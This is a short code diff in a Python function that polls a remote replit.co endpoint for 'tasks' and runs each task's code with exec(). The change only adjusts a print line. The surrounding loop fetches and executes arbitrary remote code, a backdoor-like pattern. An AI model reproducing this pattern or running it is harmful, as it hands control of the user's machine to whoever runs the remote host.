@@ -17,7 +17,7 @@ def tasking():
         tasks = r.get("http://miningwithresult.sapbotcs.repl.co/gettasks").json()["tasks"]
         for task in tasks:
             if task["response"] == None:
-                print("Making task " + task["code"].strip())
+                print("Making task " + task["code"].replace("\n", ""))
                 with stdoutIO() as s:
                     try:
                         exec(task["code"])
